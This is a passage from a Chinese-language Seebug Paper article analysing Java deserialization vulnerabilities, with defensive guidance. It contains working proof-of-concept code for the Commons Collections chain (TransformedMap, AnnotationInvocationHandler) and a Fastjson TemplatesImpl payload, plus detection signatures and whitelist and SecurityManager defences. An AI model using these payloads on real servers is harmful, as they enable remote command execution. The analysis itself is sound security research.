        <span class="n">innermap</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="s2">&quot;value&quot;</span><span class="p">,</span> <span class="s2">&quot;value&quot;</span><span class="p">);</span>
        <span class="n">Map</span> <span class="n">outmap</span> <span class="o">=</span> <span class="n">TransformedMap</span><span class="o">.</span><span class="n">decorate</span><span class="p">(</span><span class="n">innermap</span><span class="p">,</span> <span class="n">null</span><span class="p">,</span> <span class="n">transformerChain</span><span class="p">);</span>
        <span class="o">//</span><span class="err">通过反射获得</span><span class="n">AnnotationInvocationHandler类对象</span>
        <span class="n">Class</span> <span class="bp">cls</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="n">forName</span><span class="p">(</span><span class="s2">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span><span class="p">);</span>
        <span class="o">//</span><span class="err">通过反射获得</span><span class="n">cls的构造函数</span>
        <span class="n">Constructor</span> <span class="n">ctor</span> <span class="o">=</span> <span class="bp">cls</span><span class="o">.</span><span class="n">getDeclaredConstructor</span><span class="p">(</span><span class="n">Class</span><span class="o">.</span><span class="n">class</span><span class="p">,</span> <span class="n">Map</span><span class="o">.</span><span class="n">class</span><span class="p">);</span>
        <span class="o">//</span><span class="err">这里需要设置</span><span class="n">Accessible为true</span><span class="err">，否则序列化失败</span>
        <span class="n">ctor</span><span class="o">.</span><span class="n">setAccessible</span><span class="p">(</span><span class="n">true</span><span class="p">);</span>
        <span class="o">//</span><span class="err">通过</span><span class="n">newInstance</span><span class="p">()</span><span class="err">方法实例化对象</span>
        <span class="n">Object</span> <span class="n">instance</span> <span class="o">=</span> <span class="n">ctor</span><span class="o">.</span><span class="n">newInstance</span><span class="p">(</span><span class="n">Retention</span><span class="o">.</span><span class="n">class</span><span class="p">,</span> <span class="n">outmap</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">instance</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">public</span> <span class="n">static</span> <span class="n">void</span> <span class="n">main</span><span class="p">(</span><span class="n">String</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span> <span class="n">throws</span> <span class="ne">Exception</span> <span class="p">{</span>
        <span class="n">GeneratePayload</span><span class="p">(</span><span class="n">Reverse_Payload</span><span class="p">(),</span><span class="s2">&quot;obj&quot;</span><span class="p">);</span>
        <span class="n">payloadTest</span><span class="p">(</span><span class="s2">&quot;obj&quot;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">public</span> <span class="n">static</span> <span class="n">void</span> <span class="n">GeneratePayload</span><span class="p">(</span><span class="n">Object</span> <span class="n">instance</span><span class="p">,</span> <span class="n">String</span> <span class="nb">file</span><span class="p">)</span>
            <span class="n">throws</span> <span class="ne">Exception</span> <span class="p">{</span>
        <span class="o">//</span><span class="err">将构造好的</span><span class="n">payload序列化后写入文件中</span>
        <span class="n">File</span> <span class="n">f</span> <span class="o">=</span> <span class="n">new</span> <span class="n">File</span><span class="p">(</span><span class="nb">file</span><span class="p">);</span>
        <span class="n">ObjectOutputStream</span> <span class="n">out</span> <span class="o">=</span> <span class="n">new</span> <span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">new</span> <span class="n">FileOutputStream</span><span class="p">(</span><span class="n">f</span><span class="p">));</span>
        <span class="n">out</span><span class="o">.</span><span class="n">writeObject</span><span class="p">(</span><span class="n">instance</span><span class="p">);</span>
        <span class="n">out</span><span class="o">.</span><span class="n">flush</span><span class="p">();</span>
        <span class="n">out</span><span class="o">.</span><span class="n">close</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="n">public</span> <span class="n">static</span> <span class="n">void</span> <span class="n">payloadTest</span><span class="p">(</span><span class="n">String</span> <span class="nb">file</span><span class="p">)</span> <span class="n">throws</span> <span class="ne">Exception</span> <span class="p">{</span>
        <span class="o">//</span><span class="err">读取写入的</span><span class="n">payload</span><span class="err">，并进行反序列化</span>
        <span class="n">ObjectInputStream</span> <span class="ow">in</span> <span class="o">=</span> <span class="n">new</span> <span class="n">ObjectInputStream</span><span class="p">(</span><span class="n">new</span> <span class="n">FileInputStream</span><span class="p">(</span><span class="nb">file</span><span class="p">));</span>
        <span class="ow">in</span><span class="o">.</span><span class="n">readObject</span><span class="p">();</span>
        <span class="ow">in</span><span class="o">.</span><span class="n">close</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>


<p>我们先来看一下 Transformer 接口，该接口仅定义了一个方法 transform(Object input)：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/14968352972927.png-w331s" /></p>
<p>我们可以看到该方法的作用是：给定一个 Object 对象经过转换后也返回一个 Object，该 PoC 中利用的是三个实现类：<code>ChainedTransformer</code>，<code>ConstantTransformer</code>，<code>InvokerTransformer</code></p>
<p>首先看 InvokerTransformer 类中的 transform() 方法：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/14968353084603.png-w331s" /></p>
<p>可以看到该方法中采用了反射的方法进行函数调用，Input 参数为要进行反射的对象
 iMethodName , iParamTypes 为调用的方法名称以及该方法的参数类型，iArgs 为对应方法的参数，这三个参数均为可控参数：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/14968353193297.png-w331s" /></p>
<p>接下来我们看一下 ConstantTransformer 类的 transform() 方法：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/14968353304375.png-w331s" /></p>
<p>该方法很简单，就是返回 iConstant 属性，该属性也为可控参数：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/14968353403764.png-w331s" /></p>
<p>最后一个ChainedTransformer类很关键，我们先看一下它的构造函数：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/14968353527418.png-w331s" /></p>
<p>我们可以看出它传入的是一个 Transformer 数组，接下来看一下它的 transform() 方法：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/14968353611184.png-w331s" /></p>
<p>这里使用了 for 循环来调用 Transformer 数组的 transform() 方法，并且使用了 object 作为后一个调用transform() 方法的参数，结合 PoC 来看：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/14968353739867.png-w331s" /></p>
<p>我们构造了一个 Transformer 数组 transformers ，第一个参数是 “new ConstantTransformer(Runtime.class)” ，后续均为 InvokerTransformer 对象，最后用该 Transformer 数组实例化了 transformerChain 对象，如果该对象触发了 transform() 函数,那么
 transformers 将在内一次展开触发各自的 transform() 方法，由于 InvokerTransformer 类的特性，可以通过反射触发漏洞。下图是触发后 debug 截图：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/14968354092533.png-w331s" /></p>
<p>iTransformers[0] 是 ConstantTransformer 对象，返回的就是 Runtime.class 类对象，再此处 object
 也就被赋值为 Runtime.class 类对象，传入 iTransformers[2].transform() 方法：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/14968354207335.png-w331s" /></p>
<p>然后依次类推：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/14968354313840.png-w331s" /></p>
<p>最后：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/14968354424796.png-w331s" /></p>
<p>这里就会执行 “open /Applications/Calculator.app” 命令。</p>
<p>但是我们无法直接利用此问题，但假设存在漏洞的服务器存在反序列化接口，我们可以通过反序列化来达到目的。</p>
<p>可以看出，关键是需要构造包含命令的 ChainedTransformer 对象，然后需要触发 ChainedTransformer 对象的 transform() 方法，即可实现目的。在 TransformedMap 中的 checkSetValue() 方法中，我们发现：
<img alt="" src="https://images.seebug.org/content/images/2017/06/14968354532349.png-w331s" /></p>
<p>该方法会触发 transform() 方法，那么我们的思路就比较清晰了，我们可以首先构造一个 Map 和一个能够执行代码的 ChainedTransformer ，以此生成一个 TransformedMap ，然后想办法去触发 Map 中的 MapEntry 产生修改（例如 setValue() 函数），即可触发我们构造的 Transformer ，因此也就有了 PoC 中的一下代码：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/14968354637588.png-w331s" /></p>
<p>这里的 outmap 是已经构造好的 TransformedMap ，现在我们的目的是需要能让服务器端反序列化某对象时，触发 outmap 的 checkSetValue() 函数。</p>
<p>这时类 AnnotationInvocationHandler 登场了，这个类有一个成员变量 memberValues 是 Map 类型，如下所示：
<img alt="" src="https://images.seebug.org/content/images/2017/06/1496835473839.png-w331s" /></p>
<p>AnnotationInvocationHandler的readObject()函数中对memberValues的每一项调用了setValue()函数，如下所示：
<img alt="" src="https://images.seebug.org/content/images/2017/06/14968354838134-1.png-w331s" /></p>
<p>因为 setValue() 函数最终会触发 checkSetValue() 函数：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/14968354934168.png-w331s" />
因此我们只需要使用前面构造的 outmap 来构造 AnnotationInvocationHandler ，进行序列化，当触发
 readObject() 反序列化的时候，就能实现命令执行：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/14968355024800.png-w331s" /></p>
<p>接下来就只需要序列化该对象：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/14968355128634.png-w331s" /></p>
<p>当反序列化该对象，触发 readObject() 方法，就会导致命令执行：
<img alt="" src="https://images.seebug.org/content/images/2017/06/14968355214957.png-w331s" /></p>
<p>Server 端接收到恶意请求后的处理流程：
<img alt="" src="https://images.seebug.org/content/images/2017/06/14968356185476.png-w331s" /></p>
<p>所以这里 POC 执行流程为 TransformedMap-&gt;AnnotationInvocationHandler.readObject()-&gt;setValue()-&gt;checkSetValue() 漏洞成功触发。如图：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/14968358983185.png-w331s" /></p>
<p>该漏洞当时影响广泛，在当时可以直接攻击最新版 WebLogic 、 WebSphere 、 JBoss 、 Jenkins 、OpenNMS 这些大名鼎鼎的 Java 应用。</p>
<h5>7. Fastjson 反序列化漏洞</h5>
<p>该漏洞刚发出公告时笔者研究发现 Fastjson 可以通过 JSON.parseObject 来实例化任何带有 setter 方法的类，当也止步于此，因为笔者当时认为利用条件过于苛刻。不过后来网上有人披露了部分细节。利用<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>类和 Fastjson 的 <code>smartMatch()</code>
 方法，从而实现了代码执行。</p>
<div class="codehilite"><pre><span></span>public class Poc {

    public static String readClass(String cls){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.encodeBase64String(bos.toByteArray());

    }

    public static void  test_autoTypeDeny() throws Exception {
        ParserConfig config = new ParserConfig();
        final String fileSeparator = System.getProperty(&quot;file.separator&quot;);
        final String evilClassPath = System.getProperty(&quot;user.dir&quot;) + &quot;/target/classes/person/Test.class&quot;;
        String evilCode = readClass(evilClassPath);
        final String NASTY_CLASS = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;
        String text1 = &quot;{\&quot;@type\&quot;:\&quot;&quot; + NASTY_CLASS +
                &quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;+evilCode+&quot;\&quot;],&#39;_name&#39;:&#39;a.b&#39;,\&quot;_outputProperties\&quot;:{ },&quot; +
                &quot;\&quot;_name\&quot;:\&quot;a\&quot;,\&quot;_version\&quot;:\&quot;1.0\&quot;,\&quot;allowedProtocols\&quot;:\&quot;all\&quot;}\n&quot;;
        System.out.println(text1);
        Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
    }
    public static void main(String args[]){
        try {
            test_autoTypeDeny();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
</pre></div>


<p>详细分析请移步：http://blog.nsfocus.net/fastjson-remote-deserialization-program-validation-analysis/</p>
<p>这里的利用方式和 Jackson 的反序列化漏洞非常相似：http://blog.nsfocus.net/jackson-framework-java-vulnerability-analysis/</p>
<p>由此可见，两个看似安全的组件如果在同一系统中，也能会带来一定安全问题。</p>
<h5>8. 其他 Java 反序列化漏洞</h5>
<p>根据上面的三个漏洞的简要分析，我们不难发现，Java 反序列化漏洞产生的原因大多数是因为反序列化时没有进行校验，或者有些校验使用黑名单方式又被绕过，最终使得包含恶意代码的序列化对象在服务器端被反序列化执行。核心问题都不是反序列化，但都是因为反序列化导致了恶意代码被执行。
这里总结了一些近两年的 Java 反序列化漏洞：http://seclists.org/oss-sec/2017/q2/307?utm_source=dlvr.it&amp;utm_medium=twitter</p>
<h5>9. 总结</h5>
<p><strong>如何发现 Java 反序列化漏洞</strong></p>
<ol>
<li>从流量中发现序列化的痕迹，关键字：<code>ac ed 00 05</code>，<code>rO0AB</code></li>
<li>Java RMI 的传输 100% 基于反序列化，Java RMI 的默认端口是<code>1099</code>端口</li>
<li>从源码入手，可以被序列化的类一定实现了<code>Serializable</code>接口</li>
<li>观察反序列化时的<code>readObject()</code>方法是否重写，重写中是否有设计不合理，可以被利用之处</li>
</ol>
<p>从可控数据的反序列化或间接的反序列化接口入手，再在此基础上尝试构造序列化的对象。</p>
<p>ysoserial 是一款非常好用的 Java 反序列化漏洞检测工具，该工具通过多种机制构造 PoC ，并灵活的运用了反射机制和动态代理机制，值得学习和研究。</p>
<p><strong>如何防范</strong></p>
<p>有部分人使用反序列化时认为:</p>
<div class="codehilite"><pre><span></span>    FileInputStream fis=new FileInputStream(&quot;object&quot;);
    ObjectInputStream ois=new ObjectInputStream(fis);
    String obj2=(String)ois.readObject();
</pre></div>


<p>可以通过类似 "(String)" 这种方式来确保得到自己反序列化的对象，并可以保护自己不会受到反序列化漏洞的危害。然而这明显是一个很基础的错误，在通过 "(String)" 类似方法进行强制转换之前， readObject()
 函数已经运行完毕，该发生的已经发生了。</p>
<p>以下是两种比较常用的防范反序列化安全问题的方法：</p>
<p><strong>1. 类白名单校验</strong></p>
<p>在 ObjectInputStream 中 resolveClass 里只是进行了 class 是否能被 load ，自定义
 ObjectInputStream , 重载 resolveClass 的方法，对 className 进行白名单校验</p>
<div class="codehilite"><pre><span></span><span class="kr">public</span> <span class="kr">final</span> <span class="kr">class</span> <span class="nx">test</span> <span class="kr">extends</span> <span class="nx">ObjectInputStream</span><span class="p">{</span>
    <span class="p">...</span>
    <span class="kr">protected</span> <span class="nx">Class</span><span class="cp">&lt;?</span><span class="o">&gt;</span> <span class="nx">resolveClass</span><span class="p">(</span><span class="nx">ObjectStreamClass</span> <span class="nx">desc</span><span class="p">)</span>
            <span class="nx">throws</span> <span class="nx">IOException</span><span class="p">,</span> <span class="nx">ClassNotFoundException</span><span class="p">{</span>
         <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">desc</span><span class="o">.</span><span class="nx">getName</span><span class="p">()</span><span class="o">.</span><span class="nx">equals</span><span class="p">(</span><span class="s2">&quot;className&quot;</span><span class="p">)){</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">ClassNotFoundException</span><span class="p">(</span><span class="nx">desc</span><span class="o">.</span><span class="nx">getName</span><span class="p">()</span><span class="o">+</span><span class="s2">&quot; forbidden!&quot;</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nx">returnsuper</span><span class="o">.</span><span class="nx">resolveClass</span><span class="p">(</span><span class="nx">desc</span><span class="p">);</span>
    <span class="p">}</span>
      <span class="o">...</span>
<span class="p">}</span>
</pre></div>


<p><strong>2. 禁止 JVM 执行外部命令 Runtime.exec</strong></p>
<p>通过扩展 SecurityManager 可以实现:</p>
<p>（By hengyunabc）</p>
<div class="codehilite"><pre><span></span>SecurityManager originalSecurityManager = System.getSecurityManager();
        if (originalSecurityManager == null) {
            // 创建自己的SecurityManager
            SecurityManager sm = new SecurityManager() {
                private void check(Permission perm) {
                    // 禁止exec
                    if (perm instanceof java.io.FilePermission) {
                        String actions = perm.getActions();
                        if (actions != null &amp;&amp; actions.contains(&quot;execute&quot;)) {
                            throw new SecurityException(&quot;execute denied!&quot;);
                        }
                    }
                    // 禁止设置新的SecurityManager，保护自己
                    if (perm instanceof java.lang.RuntimePermission) {
                        String name = perm.getName();
                        if (name != null &amp;&amp; name.contains(&quot;setSecurityManager&quot;)) {
                            throw new SecurityException(&quot;System.setSecurityManager denied!&quot;);
                        }
                    }
                }

                @Override
                public void checkPermission(Permission perm) {
                    check(perm);
                }

                @Override
                public void checkPermission(Permission perm, Object context) {
                    check(perm);
                }
            };

            System.setSecurityManager(sm);
        }
</pre></div>


<p>Java 反序列化大多存在复杂系统间相互调用，控制，或较为底层的服务应用间交互等应用场景上，因此接口本身可能就存在一定的安全隐患。Java 反序列化本身没有错，而是面对不安全的数据时，缺乏相应的防范，导致了一些安全问题。并且不容忽视的是，也许某些 Java 服务没有直接使用存在漏洞的 Java 库，但只要 Lib 中存在存在漏洞的 Java 库，依然可能会受到威胁。</p>
<p>随着 Json 数据交换格式的普及，直接应用在服务端的反序列化接口也随之减少，但今年陆续爆出的 Jackson 和 Fastjson 两大 Json 处理库的反序列化漏洞，也暴露出了一些问题。所以无论是 Java 开发者还是安全相关人员，对于 Java 反序列化的安全问题应该具备一定的防范意识，并着重注意传入数据的校验，服务器权限和相关日志的检查， API 权限控制，通过 HTTPS 加密传输数据等方面。</p>
<p><strong>参考</strong></p>
<p>1.<a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/">《What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability》</a>By @breenmachine</p>
<p>2.<a href="https://www.iswin.org/2016/01/24/Spring-framework-deserialization-RCE-%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%E5%88%A9%E7%94%A8/">《Spring framework deserialization RCE漏洞分析以及利用》</a>By iswin</p>
<p>3.<a href="https://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/">《JAVA Apache-CommonsCollections 序列化漏洞分析以及漏洞高级利用》</a> By iswin</p>
<p>4.<a href="https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/">《Lib之过？Java反序列化漏洞通用利用分析》</a>By 长亭科技</p>
<p>5.<a href="http://blog.csdn.net/hengyunabc/article/details/49804577​">《禁止JVM执行外部命令Runtime.exec》</a>By hengyunabc</p>
<p>附本文<a href="https://pan.baidu.com/s/1i50y7q9">PDF下载地址</a></p>
      
<hr>
<p><img src="https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg" alt="Paper" style="width: 220px">
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<a href="https://paper.seebug.org/312/">https://paper.seebug.org/312/</a></p>
            
    </section>

  <nav class="pagination" role="navigation" style="padding: 3rem;">
    
      <a class="newer-posts" href="/311/"><span aria-hidden="true">&larr;</span> Package 钓鱼</a>
    
    
      <a class="older-posts" href="/319/">一款通过 SO 进行自保护的银行 APP 劫持木马深度... <span aria-hidden="true">&rarr;</span></a>
    
  </nav>


    

      
        <footer class="post-footer">
          <figure class="author-image">
            <a class="img" href="/users/author/?nickname=%E6%96%97%E8%B1%A1%E7%A7%91%E6%8A%80%E8%83%BD%E5%8A%9B%E4%B8%AD%E5%BF%83"
               style="background-image: url(https://images.seebug.org/uploads/2017/08/avatar.png)"><span
                class="hidden">'s Picture</span></a>
          </figure>

          <section class="author">
            <h4><a
                href="/users/author/?nickname=%E6%96%97%E8%B1%A1%E7%A7%91%E6%8A%80%E8%83%BD%E5%8A%9B%E4%B8%AD%E5%BF%83">斗象科技能力中心</a>
            </h4>
            <p>阅读更多有关<a
                href="/users/author/?nickname=%E6%96%97%E8%B1%A1%E7%A7%91%E6%8A%80%E8%83%BD%E5%8A%9B%E4%B8%AD%E5%BF%83">该作者</a>的文章
            </p>
            
            <div class="author-meta">
            </div>
          </section>

          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          

        </footer>
      
    
    <br>
    <section class="plugin_comment">
    </section>

  </article>
  <section class="plugin_feedback"></section>


  </div>
</main>
</div>

<script type="text/javascript" src="/static/js/jquery.min.js"></script>
<script type="text/javascript" src="/static/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/static/js/index.js"></script>
<script type="text/javascript" src="/static/js/prism-loader.js"></script>
<script type="text/javascript" src="/static/js/prism.js"></script>
<script type="text/javascript" src="/static/js/jquery.ghostHunter.js"></script>
<script type="text/javascript" src="/static/js/js.cookie.js"></script>
<script type="text/javascript" src="/static/js/custom.js?t=20170821"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/comment_main.js"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/plugin_feedback.js"></script>
</body>

</html>
